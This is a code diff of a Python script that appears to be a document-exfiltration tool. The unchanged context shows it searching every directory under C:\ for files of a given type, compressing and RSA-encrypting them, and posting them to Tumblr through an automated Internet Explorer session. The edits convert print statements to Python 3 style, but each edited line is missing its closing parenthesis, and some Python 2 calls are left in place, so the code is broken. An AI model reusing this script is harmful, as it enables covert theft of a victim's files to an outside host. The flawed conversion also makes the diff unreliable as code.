@@ -35,11 +35,11 @@ def encrypt_string(plaintext):
 
     chunk_size = 256
 
-    print "Compressing: %d bytes" % len(plaintext)
+    print("Compressing: %d bytes" % len(plaintext)
 
     plaintext = zlib.compress(plaintext)
 
-    print "Encrypting %d bytes" % len(plaintext)
+    print("Encrypting %d bytes" % len(plaintext)
 
     rsakey = RSA.importKey(public_key)
     rsakey = PKCS1_OAEP.new(rsakey)
@@ -59,7 +59,7 @@ def encrypt_string(plaintext):
 
 
     encrypted = encrypted.encode("base64")
-    print "Base64 encoded crypto: %d" % len(encrypted)
+    print("Base64 encoded crypto: %d" % len(encrypted)
     return encrypted
 
 def encrypt_post(filename):
@@ -120,10 +120,10 @@ def post_to_tumblr(ie,title,post):
             i.focus()
         elif i.id == "post_two":
             i.setAttribute("innerHTML",post)
-            print "Set text area"
+            print("Set text area"
             i.focus()
         elif i.id == "create_post":
-            print "Found post button"
+            print("Found post button"
             post_form = i
             i.focus()
 
@@ -149,9 +149,9 @@ def exfiltrate(document_path):
     ie.Navigate("http://www.tumblr.com/login")
     wait_for_browser(ie)
 
-    print "Logging in..."
+    print("Logging in..."
     login_to_tumblr(ie)
-    print "Logged in...navigating"
+    print("Logged in...navigating"
 
     ie.Navigate("https://www.tumblr.com/new/text")
     wait_for_browser(ie)
@@ -159,9 +159,9 @@ def exfiltrate(document_path):
     # encrypt the file
     title,body = encrypt_post(document_path)
 
-    print "Creating new post..."
+    print("Creating new post..."
     post_to_tumblr(ie,title,body)
-    print "Posted!"
+    print("Posted!"
 
     # Destroy the IE instance
     ie.Quit()
@@ -173,6 +173,6 @@ def exfiltrate(document_path):
 for parent, directories, filenames in os.walk("C:\\"):
     for filename in fnmatch.filter(filenames,"*%s" % doc_type):
         document_path = os.path.join(parent,filename)
-        print "Found: %s" % document_path
+        print("Found: %s" % document_path
         exfiltrate(document_path)
         raw_input("Continue?")
